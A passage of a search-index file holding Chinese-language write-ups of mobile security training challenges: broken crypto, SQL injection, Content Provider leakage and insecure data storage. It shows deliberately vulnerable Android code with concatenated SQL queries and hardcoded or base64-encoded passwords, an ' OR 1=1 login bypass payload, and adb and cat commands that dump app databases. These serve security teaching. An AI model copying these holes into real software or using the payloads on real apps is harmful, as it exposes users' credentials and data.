\u52a0\u5bc6\u6280\u672f\u662f\u5f88\u96be\u6b63\u786e\u9009\u62e9\u7684,\u56e0\u6b64\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4e0d\u4f73\u7684\u52a0\u5bc6\u6280\u672f,\u4ece\u800c\u6210\u4e3a\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u7684\u5bf9\u8c61.\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4e0d\u5b89\u5168\u5730\u4f20\u8f93\u52a0\u5bc6\u94a5\u5319,\u6bd4\u5982\u4f7f\u7528\u4e00\u4e2a\u5df2\u77e5\u7684\u635f\u574f\u7684\u6216\u5df2\u8fc7\u65f6\u7684\u52a0\u5bc6\u7b97\u6cd5\u6216\u5f00\u53d1\u4eba\u5458\u521b\u5efa\u4ed6\u4eec\u81ea\u5df1\u7684\u52a0\u5bc6\u7b97\u6cd5. \u4e0d\u5b8c\u5584\u7684\u5bc6\u5319\u7ba1\u7406\u53ef\u80fd\u662f\u7531\u4e8e\u786c\u7684\u7f16\u7801\u94a5\u5319,\u5b58\u50a8\u5728\u76ee\u5f55\u4e2d\u7684\u94a5\u5319,\u4ee5\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u4f20\u9001\u5bc6\u94a5\u6216\u603b\u662f\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5.\u5982\u679c\u4e00\u4e2a App \u7684\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684, \u672a\u7ecf\u9a8c\u8bc1\u7684, \u672a\u6d4b\u8bd5\u7684\u52a0\u5bc6\u7b97\u6cd5\u5219\u5927\u5927\u52a0\u5927\u4e86\u52a0\u5bc6\u6570\u636e\u53ef\u653b\u51fb\u7684\u53ef\u80fd\u6027. \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u6d88\u606f\u6ca1\u6709\u88ab\u52a0\u5bc6\uff0c\u53ea\u662fhex\u7f16\u7801 5468697320636f6e766572736174696f6e206973206e6f7420656e6372797074656420616e64207468657265666f7265206e6f742073656375726520696e2074686520736c6967687465737421205365637572697479206e65766572206d61646520697420746f207468652066696e616c2070726f647563742e204f757220646973636c61696d657220636c6561726c792073746174657320746861742075736572732073686f756c64206e6f742073656e642073656e7369746976652064617461206f766572206f7572204170702e \u4f7f\u7528\u5728\u7ebf\u89e3\u5bc6 www.asciitohex.com \u603b\u7ed3 \u00b6","title":"Broken Crypto(\u5931\u6548\u7684\u52a0\u5bc6)"},{"location":"vul/app/Broken-Crypto.html#broken-crypto","text":"","title":"Broken Crypto(\u5931\u6548\u7684\u52a0\u5bc6)"},{"location":"vul/app/Broken-Crypto.html#_1","text":"\u52a0\u5bc6\u6280\u672f\u662f\u5f88\u96be\u6b63\u786e\u9009\u62e9\u7684,\u56e0\u6b64\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4e0d\u4f73\u7684\u52a0\u5bc6\u6280\u672f,\u4ece\u800c\u6210\u4e3a\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u7684\u5bf9\u8c61.\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4e0d\u5b89\u5168\u5730\u4f20\u8f93\u52a0\u5bc6\u94a5\u5319,\u6bd4\u5982\u4f7f\u7528\u4e00\u4e2a\u5df2\u77e5\u7684\u635f\u574f\u7684\u6216\u5df2\u8fc7\u65f6\u7684\u52a0\u5bc6\u7b97\u6cd5\u6216\u5f00\u53d1\u4eba\u5458\u521b\u5efa\u4ed6\u4eec\u81ea\u5df1\u7684\u52a0\u5bc6\u7b97\u6cd5. \u4e0d\u5b8c\u5584\u7684\u5bc6\u5319\u7ba1\u7406\u53ef\u80fd\u662f\u7531\u4e8e\u786c\u7684\u7f16\u7801\u94a5\u5319,\u5b58\u50a8\u5728\u76ee\u5f55\u4e2d\u7684\u94a5\u5319,\u4ee5\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u4f20\u9001\u5bc6\u94a5\u6216\u603b\u662f\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5.\u5982\u679c\u4e00\u4e2a App \u7684\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684, \u672a\u7ecf\u9a8c\u8bc1\u7684, \u672a\u6d4b\u8bd5\u7684\u52a0\u5bc6\u7b97\u6cd5\u5219\u5927\u5927\u52a0\u5927\u4e86\u52a0\u5bc6\u6570\u636e\u53ef\u653b\u51fb\u7684\u53ef\u80fd\u6027.","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Broken-Crypto.html#_2","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Broken-Crypto.html#_3","text":"\u6d88\u606f\u6ca1\u6709\u88ab\u52a0\u5bc6\uff0c\u53ea\u662fhex\u7f16\u7801 5468697320636f6e766572736174696f6e206973206e6f7420656e6372797074656420616e64207468657265666f7265206e6f742073656375726520696e2074686520736c6967687465737421205365637572697479206e65766572206d61646520697420746f207468652066696e616c2070726f647563742e204f757220646973636c61696d657220636c6561726c792073746174657320746861742075736572732073686f756c64206e6f742073656e642073656e7369746976652064617461206f766572206f7572204170702e \u4f7f\u7528\u5728\u7ebf\u89e3\u5bc6 www.asciitohex.com","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Broken-Crypto.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/app/Client-Side-Injection.html","text":"Client Side Injection(\u79fb\u52a8\u5ba2\u6237\u7aef\u6ce8\u5165) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u79fb\u52a8\u5ba2\u6237\u7aef\u5982\u679c\u63a5\u6536\u7528\u6237\u8f93\u5165\uff0c\u5e76\u4e14\u8fdb\u884cSQL\u67e5\u8be2\uff0c\u53ef\u80fd\u5bfc\u81f4SQL\u6ce8\u5165 \u539f\u9898 \u5ba2\u6237\u7aef\u767b\u5f55\u6ce8\u5165\u53d1\u751f\u5728\u5f53\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u8f93\u5165\u53ef\u6267\u884c\u7684,\u53ef\u6539\u53d8\u4e00\u4e2a App \u8fd0\u884c\u67e5\u8be2\u7684SQLite\u547d\u4ee4. \u8be5\u8bfe\u7684 APK \u4f7f\u7528 AES \u52a0\u5bc6\u5b83\u7684\u6570\u636e\u5e93. \u8981\u901a\u8fc7\u653b\u51fb\u52a0\u5bc6\u7cfb\u7edf\u53bb\u7a83\u53d6\u767b\u5f55\u4fe1\u606f\u4f1a\u76f8\u5f53\u56f0\u96be,\u5982\u82e5\u4f7f\u7528 SQL \u6ce8\u5165\u6765\u7ed5\u8fc7\u767b\u5f55\u5c06\u4f1a\u66f4\u52a0\u7b80\u5355. \u8fc7\u6ee4\u7528\u6237\u8f93\u5165\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u65e0\u6548\u7684\u9632\u5fa1\u5ba2\u6237\u7aef\u6ce8\u5165\u65b9\u6cd5.\u7136\u540e\u66ff\u6362\u6389\u5173\u952e\u8bcd\u50cf SELECT, WHERE, FROM \u548c\u70b9\u6216\u7a7a\u683c. \u8fc7\u6ee4\u5c06\u53ea\u80fd\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u653b\u7834\u6ce8\u5165\u7f3a\u9677,\u4f46\u5374\u4e0d\u80fd\u963b\u6b62\u5165\u4fb5. \u4e00\u4e2a\u5b89\u5168\u7cfb\u7edf\u53ea\u662f\u53d6\u51b3\u4e8e\u5176\u6700\u8584\u5f31\u7684\u73af\u8282. \u6b63\u5982\u8c1a\u8bed\u4e00\u73af\u8f6f\u5f31,\u5168\u94fe\u4e0d\u5f3a.\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u7528\u6237\u7684\u51ed\u8bc1. \u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053 APK \u4f7f\u7528\u8fd0\u884c\u4e00\u6761 SQL \u67e5\u8be2\u8bed\u53e5\u4f5c\u4e3a\u7ecf\u5178\u7684\u4f8b\u5b50\u6765\u9a8c\u8bc1\u4e00\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u5b58\u5728, \u901a\u8fc7\u5728\u4e00\u6761 SELECT \u7533\u660e\u4e2d\u9644\u52a0\u7528\u6237\u540d\u548c\u5bc6\u7801\u5230\u4e00\u4e2a String. \u5982\u679c\u8be5\u7533\u660e\u8fd4\u56de true,\u5219\u8be5\u7528\u6237\u5df2\u767b\u5f55. \u529f\u80fd\u5b9e\u73b0 \u00b6 try { String dbPath = this.getDatabasePath(\"Members.db\").getPath(); SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbPath, dbPass, null); String query = (\"SELECT * FROM MEMBERS WHERE memName='\" + username + \"' AND memPass = '\" + password + \"';\"); //\u767b\u5f55\u754c\u9762\u8fdb\u884c\u5178\u578b\u7684SQL\u67e5\u8be2 Cursor cursor = db.rawQuery(query, null); if (cursor != null) { if (cursor.getCount() <= 0) { cursor.close(); return false; } } } catch (Exception e) { // TODO Auto-generated catch block Toast error = Toast.makeText(CSInjection.this, \"An error occurred.\", Toast.LENGTH_LONG); error.show(); key.getText().clear(); key.setHint(\"The key is only shown to authenticated users.\"); return false; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u7ecf\u5178\u7684\u4e07\u80fd\u5bc6\u7801 \u53ef\u4ee5\u767b\u5f55 \u7528\u6237\u540d ' OR 1=1 or '1'='1 \u5bc6\u7801 \u9664\u5355\u5f15\u53f7\u5916 \u4efb\u610f\u5b57\u7b26 \u603b\u7ed3 \u00b6 \u9700\u8981\u8fc7\u6ee4\u7528\u6237\u8f93\u5165","title":"Client Side Injection(\u79fb\u52a8\u5ba2\u6237\u7aef\u6ce8\u5165)"},{"location":"vul/app/Client-Side-Injection.html#client-side-injection","text":"","title":"Client Side Injection(\u79fb\u52a8\u5ba2\u6237\u7aef\u6ce8\u5165)"},{"location":"vul/app/Client-Side-Injection.html#_1","text":"\u79fb\u52a8\u5ba2\u6237\u7aef\u5982\u679c\u63a5\u6536\u7528\u6237\u8f93\u5165\uff0c\u5e76\u4e14\u8fdb\u884cSQL\u67e5\u8be2\uff0c\u53ef\u80fd\u5bfc\u81f4SQL\u6ce8\u5165 \u539f\u9898 \u5ba2\u6237\u7aef\u767b\u5f55\u6ce8\u5165\u53d1\u751f\u5728\u5f53\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u8f93\u5165\u53ef\u6267\u884c\u7684,\u53ef\u6539\u53d8\u4e00\u4e2a App \u8fd0\u884c\u67e5\u8be2\u7684SQLite\u547d\u4ee4. \u8be5\u8bfe\u7684 APK \u4f7f\u7528 AES \u52a0\u5bc6\u5b83\u7684\u6570\u636e\u5e93. \u8981\u901a\u8fc7\u653b\u51fb\u52a0\u5bc6\u7cfb\u7edf\u53bb\u7a83\u53d6\u767b\u5f55\u4fe1\u606f\u4f1a\u76f8\u5f53\u56f0\u96be,\u5982\u82e5\u4f7f\u7528 SQL \u6ce8\u5165\u6765\u7ed5\u8fc7\u767b\u5f55\u5c06\u4f1a\u66f4\u52a0\u7b80\u5355. \u8fc7\u6ee4\u7528\u6237\u8f93\u5165\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u65e0\u6548\u7684\u9632\u5fa1\u5ba2\u6237\u7aef\u6ce8\u5165\u65b9\u6cd5.\u7136\u540e\u66ff\u6362\u6389\u5173\u952e\u8bcd\u50cf SELECT, WHERE, FROM \u548c\u70b9\u6216\u7a7a\u683c. \u8fc7\u6ee4\u5c06\u53ea\u80fd\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u653b\u7834\u6ce8\u5165\u7f3a\u9677,\u4f46\u5374\u4e0d\u80fd\u963b\u6b62\u5165\u4fb5. \u4e00\u4e2a\u5b89\u5168\u7cfb\u7edf\u53ea\u662f\u53d6\u51b3\u4e8e\u5176\u6700\u8584\u5f31\u7684\u73af\u8282. \u6b63\u5982\u8c1a\u8bed\u4e00\u73af\u8f6f\u5f31,\u5168\u94fe\u4e0d\u5f3a.\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u7528\u6237\u7684\u51ed\u8bc1. \u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053 APK \u4f7f\u7528\u8fd0\u884c\u4e00\u6761 SQL \u67e5\u8be2\u8bed\u53e5\u4f5c\u4e3a\u7ecf\u5178\u7684\u4f8b\u5b50\u6765\u9a8c\u8bc1\u4e00\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u5b58\u5728, \u901a\u8fc7\u5728\u4e00\u6761 SELECT \u7533\u660e\u4e2d\u9644\u52a0\u7528\u6237\u540d\u548c\u5bc6\u7801\u5230\u4e00\u4e2a String. \u5982\u679c\u8be5\u7533\u660e\u8fd4\u56de true,\u5219\u8be5\u7528\u6237\u5df2\u767b\u5f55.","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Client-Side-Injection.html#_2","text":"try { String dbPath = this.getDatabasePath(\"Members.db\").getPath(); SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbPath, dbPass, null); String query = (\"SELECT * FROM MEMBERS WHERE memName='\" + username + \"' AND memPass = '\" + password + \"';\"); //\u767b\u5f55\u754c\u9762\u8fdb\u884c\u5178\u578b\u7684SQL\u67e5\u8be2 Cursor cursor = db.rawQuery(query, null); if (cursor != null) { if (cursor.getCount() <= 0) { cursor.close(); return false; } } } catch (Exception e) { // TODO Auto-generated catch block Toast error = Toast.makeText(CSInjection.this, \"An error occurred.\", Toast.LENGTH_LONG); error.show(); key.getText().clear(); key.setHint(\"The key is only shown to authenticated users.\"); return false; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Client-Side-Injection.html#_3","text":"\u7ecf\u5178\u7684\u4e07\u80fd\u5bc6\u7801 \u53ef\u4ee5\u767b\u5f55 \u7528\u6237\u540d ' OR 1=1 or '1'='1 \u5bc6\u7801 \u9664\u5355\u5f15\u53f7\u5916 \u4efb\u610f\u5b57\u7b26","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Client-Side-Injection.html#_4","text":"\u9700\u8981\u8fc7\u6ee4\u7528\u6237\u8f93\u5165","title":"\u603b\u7ed3"},{"location":"vul/app/Content-Provider-Leakage.html","text":"Content Provider Leakage(\u5185\u5bb9\u63d0\u4f9b\u8005\u6cc4\u6f0f) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u4e00\u4e2a\u5185\u5bb9\u63d0\u4f9b\u5546\u662f\u5b89\u5353\u7528\u4e8e\u63d0\u4f9b\u8fdb\u5165\u5230\u5728\u4e00\u4e2a\u4e2d\u592e\u5b58\u50a8\u5e93\u4e2d\u7684\u4e00\u4e2a\u7ed3\u6784\u5316\u6570\u636e\u96c6\u7684.\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u76ee\u7684\u662f\u7531\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee,\u7136\u800c,\u4f7f\u7528\u5b89\u5353\u8c03\u8bd5\u6865,\u4ed6\u4eec\u53ef\u4ee5\u901a\u8fc7\u4efb\u4f55\u4eba\u8bbf\u95ee\u7684\u8bbe\u5907\u8fdb\u884c\u8bbf\u95ee. \u8981\u5728\u4e0d\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\u67e5\u8be2\u4e00\u4e2a\u5185\u5bb9\u63d0\u4f9b\u8005,\u53ef\u6267\u884c\u4ee5\u4e0b adb \u547d\u4ee4: adb devices adb connect [device IP] adb shell content query --uri [Content Provider URI] \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5728\u865a\u62df\u673a\u547d\u4ee4\u884c \u6267\u884c adb shell content query --uri content://com.somewhere.hidden.SecretProvider/data \u603b\u7ed3 \u00b6 \u5408\u7406\u4f7f\u7528Content Provider, \u5c06\u5176\u8bbe\u7f6e\u4e3a\u79c1\u6709 \u5bf9\u4f20\u5165\u7684\u53c2\u6570\u8fdb\u884c\u5b89\u5168\u68c0\u67e5","title":"Content Provider Leakage(\u5185\u5bb9\u63d0\u4f9b\u8005\u6cc4\u6f0f)"},{"location":"vul/app/Content-Provider-Leakage.html#content-provider-leakage","text":"","title":"Content Provider Leakage(\u5185\u5bb9\u63d0\u4f9b\u8005\u6cc4\u6f0f)"},{"location":"vul/app/Content-Provider-Leakage.html#_1","text":"\u4e00\u4e2a\u5185\u5bb9\u63d0\u4f9b\u5546\u662f\u5b89\u5353\u7528\u4e8e\u63d0\u4f9b\u8fdb\u5165\u5230\u5728\u4e00\u4e2a\u4e2d\u592e\u5b58\u50a8\u5e93\u4e2d\u7684\u4e00\u4e2a\u7ed3\u6784\u5316\u6570\u636e\u96c6\u7684.\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u76ee\u7684\u662f\u7531\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee,\u7136\u800c,\u4f7f\u7528\u5b89\u5353\u8c03\u8bd5\u6865,\u4ed6\u4eec\u53ef\u4ee5\u901a\u8fc7\u4efb\u4f55\u4eba\u8bbf\u95ee\u7684\u8bbe\u5907\u8fdb\u884c\u8bbf\u95ee. \u8981\u5728\u4e0d\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\u67e5\u8be2\u4e00\u4e2a\u5185\u5bb9\u63d0\u4f9b\u8005,\u53ef\u6267\u884c\u4ee5\u4e0b adb \u547d\u4ee4: adb devices adb connect [device IP] adb shell content query --uri [Content Provider URI]","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Content-Provider-Leakage.html#_2","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Content-Provider-Leakage.html#_3","text":"\u5728\u865a\u62df\u673a\u547d\u4ee4\u884c \u6267\u884c adb shell content query --uri content://com.somewhere.hidden.SecretProvider/data","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Content-Provider-Leakage.html#_4","text":"\u5408\u7406\u4f7f\u7528Content Provider, \u5c06\u5176\u8bbe\u7f6e\u4e3a\u79c1\u6709 \u5bf9\u4f20\u5165\u7684\u53c2\u6570\u8fdb\u884c\u5b89\u5168\u68c0\u67e5","title":"\u603b\u7ed3"},{"location":"vul/app/Insecure-Data-Storage.html","text":"Insecure Data Storage(\u79fb\u52a8\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u7814\u53d1\u4eba\u5458\u5c06\u654f\u611f\u4fe1\u606f\u6bd4\u5982\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u4fdd\u5b58\u5230app\u4e2d,\u5982\u679c\u5f53\u624b\u673a\u4e22\u5931\u6216\u8005\u88abroot\u7684\u8bbe\u5907\u4e0a,\u5c06\u4f1a\u5bfc\u81f4\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u529f\u80fd\u5b9e\u73b0 \u00b6 app\u6e90\u4ee3\u7801 protected void onCreate(Bundle savedInstanceState) { // TODO Auto-generated method stub super.onCreate(savedInstanceState); setContentView(R.layout.ids); createDatabase(); insertKey(); } public void createDatabase() { try { Members = this.openOrCreateDatabase(\"Members\", MODE_PRIVATE, null); Members.execSQL(\"CREATE TABLE IF NOT EXISTS Members \" + \"(id integer primary key, name VARCHAR, password VARCHAR);\" ); File database = getApplication().getDatabasePath(\"Members.db\"); if (!database.exists()) { Toast.makeText(this, \"Database Created\", Toast.LENGTH_SHORT).show(); } else Toast.makeText(this, \"Database Missing\", Toast.LENGTH_SHORT).show(); } catch (Exception e) { Log.e(\"DB ERROR\", \"Error Creating Database\"); } } public void insertKey(){ Members.execSQL(\"DELETE FROM Members;\"); Members.execSQL(\"INSERT INTO Members (name, password) VALUES ('Admin','Battery777');\"); } \u521b\u5efa\u4e00\u4e2aMembers\u6570\u636e\u5e93, \u63d2\u5165\u8d26\u53f7\u548c\u5bc6\u7801 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u8fde\u63a5MobileShepherdVM3.2.3\u865a\u62df\u673a Alt + F1 \u8fdb\u5165\u547d\u4ee4\u884c cat /data/data/com.mobshep.insecuredata/databases/Members \u67e5\u770b\u654f\u611f\u4fe1\u606f \u603b\u7ed3 \u00b6 \u654f\u611f\u4fe1\u606f\u4e0d\u5e94\u8be5\u4fdd\u5b58\u5230app\u7aef","title":"Insecure Data Storage(\u79fb\u52a8\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8)"},{"location":"vul/app/Insecure-Data-Storage.html#insecure-data-storage","text":"","title":"Insecure Data Storage(\u79fb\u52a8\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8)"},{"location":"vul/app/Insecure-Data-Storage.html#_1","text":"\u7814\u53d1\u4eba\u5458\u5c06\u654f\u611f\u4fe1\u606f\u6bd4\u5982\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u4fdd\u5b58\u5230app\u4e2d,\u5982\u679c\u5f53\u624b\u673a\u4e22\u5931\u6216\u8005\u88abroot\u7684\u8bbe\u5907\u4e0a,\u5c06\u4f1a\u5bfc\u81f4\u654f\u611f\u4fe1\u606f\u6cc4\u9732","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Insecure-Data-Storage.html#_2","text":"app\u6e90\u4ee3\u7801 protected void onCreate(Bundle savedInstanceState) { // TODO Auto-generated method stub super.onCreate(savedInstanceState); setContentView(R.layout.ids); createDatabase(); insertKey(); } public void createDatabase() { try { Members = this.openOrCreateDatabase(\"Members\", MODE_PRIVATE, null); Members.execSQL(\"CREATE TABLE IF NOT EXISTS Members \" + \"(id integer primary key, name VARCHAR, password VARCHAR);\" ); File database = getApplication().getDatabasePath(\"Members.db\"); if (!database.exists()) { Toast.makeText(this, \"Database Created\", Toast.LENGTH_SHORT).show(); } else Toast.makeText(this, \"Database Missing\", Toast.LENGTH_SHORT).show(); } catch (Exception e) { Log.e(\"DB ERROR\", \"Error Creating Database\"); } } public void insertKey(){ Members.execSQL(\"DELETE FROM Members;\"); Members.execSQL(\"INSERT INTO Members (name, password) VALUES ('Admin','Battery777');\"); } \u521b\u5efa\u4e00\u4e2aMembers\u6570\u636e\u5e93, \u63d2\u5165\u8d26\u53f7\u548c\u5bc6\u7801","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Insecure-Data-Storage.html#_3","text":"\u8fde\u63a5MobileShepherdVM3.2.3\u865a\u62df\u673a Alt + F1 \u8fdb\u5165\u547d\u4ee4\u884c cat /data/data/com.mobshep.insecuredata/databases/Members \u67e5\u770b\u654f\u611f\u4fe1\u606f","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Insecure-Data-Storage.html#_4","text":"\u654f\u611f\u4fe1\u606f\u4e0d\u5e94\u8be5\u4fdd\u5b58\u5230app\u7aef","title":"\u603b\u7ed3"},{"location":"vul/app/Mobile-Broken-Crypto-1.html","text":"Mobile Broken Crypto 1(\u5931\u6548\u52a0\u5bc6 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4e86\u4e00\u79cd\u4e0d\u63a8\u8350\u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff08DES\uff09\uff0c\u6253\u7834\u4e86\u5bc6\u94a5\u7ba1\u7406\u7684\u4e00\u6761\u91cd\u8981\u89c4\u5219\u3002\u5173\u952e\u5728\u4e8e\u5bf9\u8bdd\u3002\u89e3\u5bc6\u804a\u5929\u4ee5\u83b7\u53d6\u5bc6\u94a5\u3002 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5bc6\u94a5\u662f\u4fdd\u5b58\u5728 /data/data/com.mobshep.brokencrypto1/encrypt/desKey \u4e2d \u5bc6\u94a5\u662f 123456789abcde \u5bc6\u6587\u4e32 <string name=\"message1\">mJv7SjMKHUotNI1W1rZgeMkPY5YB6PQzi8oSwBOmEJ58FL3x1lTY0j9Yx6iqK4+i51ApyYLamzbIbL84lN/AIEyrKbnbaJ0yupysVDCXMmHu7Sivr6766ah7MpbPPGdZGpbn+QZ7pdkUi8x4VqX6zsC5XMPAbKQc</string> <string name=\"message2\">g915WutGOXkVflgYAOALfpumYUMFKIMUqmWDF0JJkD1EkEq2aNFIBHKg/sPquHMDxpaE5t+rqcmQREh2KtHyxz71qqlL3G54tUflHYDalSiMbxXkKbCnwVvLRu9y/CMB</string> <string name=\"message3\">XJygdr1j/z2eiNHwJwn7okCDJlpZ5JxHjER1mJhveOOaxjBtwkUMQOJPb0Sdnu2Yw3OGpxV+3OfqYL+o3n9JVOwIKCVJc3d0pdNGmHspCgT5kXYeaegzRWLj0ClVPznpeH0cuF43em6wLnKW6Yvfaa4EqJ9tmWMZKl1nex+fTaP8tHM/3MWV+w==</string> \u603b\u7ed3 \u00b6","title":"Mobile Broken Crypto 1(\u5931\u6548\u52a0\u5bc6 1)"},{"location":"vul/app/Mobile-Broken-Crypto-1.html#mobile-broken-crypto-1-1","text":"","title":"Mobile Broken Crypto 1(\u5931\u6548\u52a0\u5bc6 1)"},{"location":"vul/app/Mobile-Broken-Crypto-1.html#_1","text":"\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4e86\u4e00\u79cd\u4e0d\u63a8\u8350\u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff08DES\uff09\uff0c\u6253\u7834\u4e86\u5bc6\u94a5\u7ba1\u7406\u7684\u4e00\u6761\u91cd\u8981\u89c4\u5219\u3002\u5173\u952e\u5728\u4e8e\u5bf9\u8bdd\u3002\u89e3\u5bc6\u804a\u5929\u4ee5\u83b7\u53d6\u5bc6\u94a5\u3002","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Mobile-Broken-Crypto-1.html#_2","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Mobile-Broken-Crypto-1.html#_3","text":"\u5bc6\u94a5\u662f\u4fdd\u5b58\u5728 /data/data/com.mobshep.brokencrypto1/encrypt/desKey \u4e2d \u5bc6\u94a5\u662f 123456789abcde \u5bc6\u6587\u4e32 <string name=\"message1\">mJv7SjMKHUotNI1W1rZgeMkPY5YB6PQzi8oSwBOmEJ58FL3x1lTY0j9Yx6iqK4+i51ApyYLamzbIbL84lN/AIEyrKbnbaJ0yupysVDCXMmHu7Sivr6766ah7MpbPPGdZGpbn+QZ7pdkUi8x4VqX6zsC5XMPAbKQc</string> <string name=\"message2\">g915WutGOXkVflgYAOALfpumYUMFKIMUqmWDF0JJkD1EkEq2aNFIBHKg/sPquHMDxpaE5t+rqcmQREh2KtHyxz71qqlL3G54tUflHYDalSiMbxXkKbCnwVvLRu9y/CMB</string> <string name=\"message3\">XJygdr1j/z2eiNHwJwn7okCDJlpZ5JxHjER1mJhveOOaxjBtwkUMQOJPb0Sdnu2Yw3OGpxV+3OfqYL+o3n9JVOwIKCVJc3d0pdNGmHspCgT5kXYeaegzRWLj0ClVPznpeH0cuF43em6wLnKW6Yvfaa4EqJ9tmWMZKl1nex+fTaP8tHM/3MWV+w==</string>","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Mobile-Broken-Crypto-1.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/app/Mobile-Insecure-Data-Storage-1.html","text":"Mobile Insecure Data Storage 1(\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 base64\u7f16\u7801\u7684\u7ba1\u7406\u5458\u5bc6\u7801\u4fdd\u5b58\u5728\u4e86\u6570\u636e\u5e93\u4e2d \u529f\u80fd\u5b9e\u73b0 \u00b6 public void insertData(){ Users.execSQL(\"DELETE FROM Users;\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('Tyrkyr','ZG9jaGRvY2hkb2No');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('ToothBrush','MmNvb2w0dWxvbD8=');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('TroolMann','QnJpZGdlcw==');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('Patrick','ZGlub3NhdXI=');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('bottles','cGFzc3dvcmQxMjM0');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('Root','V2Fyc2hpcHNBbmRXcmVuY2hlcw==');\"); } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u8bfb\u53d6\u6570\u636e,base64\u89e3\u7801 \u603b\u7ed3 \u00b6 base64\u662f\u4e0d\u5b89\u5168\u7684","title":"Mobile Insecure Data Storage 1(\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8 1)"},{"location":"vul/app/Mobile-Insecure-Data-Storage-1.html#mobile-insecure-data-storage-1-1","text":"","title":"Mobile Insecure Data Storage 1(\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8 